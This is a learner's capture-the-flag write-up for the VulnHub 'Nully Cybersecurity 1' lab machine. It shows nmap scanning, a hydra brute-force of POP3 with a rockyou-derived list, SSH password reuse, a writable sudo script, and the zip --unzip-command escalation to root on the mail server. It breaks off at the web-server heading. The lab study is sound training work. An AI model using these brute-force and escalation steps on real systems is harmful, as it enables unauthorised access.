# Nully Cybersecurity 1: Writeup

Hello, this is my first writeup, while studying for the OSCP certification. This VM (found [here](https://www.vulnhub.com/entry/nully-cybersecurity-1,549/)) was the most enjoyable so far, so I decided to create a writeup on it. It is a nice easy-intermediate level machine, that taught me a lot about pivoting and the metasploit framework.

> I'm not using Kali, or any penTest specific distro. I'm just using my Ubuntu machine. Feel free to use whatever distro you feel comfortable with.


So after you fire up the vm, give it a few minutes to start up all services. Afterwards lets start by scanning the network to identify its IP.
```
netdiscover
```
came up  with the VMs IP : 192.168.1.6

next we're going to perform a basic nmap scan on it, to see if any exposed services.
```
nmap -sV 192.168.1.6
```
wields some interesting  results:
```
Nmap scan report for nully-cybersecurity-ctf (192.168.1.6)
Host is up (0.00083s latency).
Not shown: 995 closed ports
PORT     STATE SERVICE     VERSION
80/tcp   open  http        Apache httpd 2.4.29 ((Ubuntu))
110/tcp  open  pop3        Dovecot pop3d
2222/tcp open  ssh         OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
8000/tcp open  nagios-nsca Nagios NSCA
9000/tcp open  cslistener?
```

So aparently there's a web server worth checking out first with our browser at: `http//192.168.1.6`

There, the creator of this VM informs us that there are 3 hosts in the internal network of the VM:
- a mail server
- a web server (other than the one serving the instructions page)
- and a database server

the creator of the VM is also hinting that we should start from the mail server, which makes sence as we can see that it's exposed to the external network from our nmap results. He also gives as a mail account's credentials to check the inbox.

lets do that first.

## Rooting the mailServer
I will use netcat to connect to the pop3 port of the mail server and some basic pop3 commands:
```
teo@ThinkPad:~$ nc 192.168.1.6 110
+OK Dovecot (Ubuntu) ready.
user pentester
+OK
pass qKnGByeaeQJWTjj2efHxst7Hu0xHADGO
+OK Logged in.
list
+OK 1 messages:
1 657
.
retr 1
+OK 657 octets
Return-Path: <root@MailServer>
X-Original-To: pentester@localhost
Delivered-To: pentester@localhost
Received: by MailServer (Postfix, from userid 0)
	id 20AE4A4C29; Tue, 25 Aug 2020 17:04:49 +0300 (+03)
Subject: About server
To: <pentester@localhost>
X-Mailer: mail (GNU Mailutils 3.7)
Message-Id: <20200825140450.20AE4A4C29@MailServer>
Date: Tue, 25 Aug 2020 17:04:49 +0300 (+03)
From: root <root@MailServer>

Hello,
I'm Bob Smith, the Nully Cybersecurity mail server administrator.
The boss has already informed me about you and that you need help accessing the server.
Sorry, I forgot my password, but I remember the password was simple.
.
^C
teo@ThinkPad:~$ 
```
There's some very important pieces of info in that email:
- mailServers' admin is named Bob
- his password is simple

So we are going to try to bruteforce bob's password. 
We're going to use hydra, so I prepared two lists for that purpose.

One with possible simple usernames for bob and one for simple passwords

heres my bob_users.txt:
```
bob
bobby
Bob
BOB
Bobby
BOBBY
```
Noting fancy here, just simple variations of bob's name.

for the password list, i'm going to do as the VM's creator suggests:
```
cat rockyou.txt | grep bobby > bob_pass.txt
```
I'm going to use hydra to bruteforce the pop3 port. You can use whatever cracking tool you feel comfortable with.
```
hydra -L bob_users.txt -P bob_pass.txt 192.168.1.6 pop3
```
After a while we actually manage to crack bob's password for pop3. Its `bobby1985`. We're going to try it iver ssh, hoping that Bob, will be using the same password. And he actually is!!! Bob's a noob admin!

so now we can login to the mailServer as bob with:
```
ssh bob@192.168.1.6 -p2222
```
Once we get access, we need to investigate if there's a way to root the mailServer.

Were going to start with the obvious `sudo -l` which has some quite interesting results:
```
bob@MailServer:~$ sudo -l
Matching Defaults entries for bob on MailServer:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User bob may run the following commands on MailServer:
    (my2user) NOPASSWD: /bin/bash /opt/scripts/check.sh
bob@MailServer:~$ ls -lart /opt/scripts/check.sh 
-rwxr-xr-x 1 bob bob 1259 Sep 15 09:50 /opt/scripts/check.sh
```
So bob can execute the /opt/scripts/check.sh script as the my2user without password and the script is also writeable by bob..

Lets go edit the script:
Just adding a `/bin/bash` at the end will do for spwaning a shell.

Now lets run the script as th my2user:
```
sudo -u my2user /bin/bash /opt/scripts/check.sh
```
the script runs... and we're now logged in as my2user!!

lets do `sudo -l` again for the my2user:
```
my2user@MailServer:~$ sudo -l
Matching Defaults entries for my2user on MailServer:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User my2user may run the following commands on MailServer:
    (root) NOPASSWD: /usr/bin/zip
```
Lucky for us the my2user can execute `/usr/bin/zip` as root without a password. Doing a little googling, I found out that zip can execute arbitrary commands like this:
```
my2user@MailServer:~$ touch file
my2user@MailServer:~$ sudo zip 1.zip file -T --unzip-command="sh -c /bin/bash"
  adding: file (stored 0%)
root@MailServer:/home/my2user# 
```

and BOOM!! The mailServer is rooted!

Reading /root/1_flag.txt inform us that the webserver should be next.

## Rooting the webServer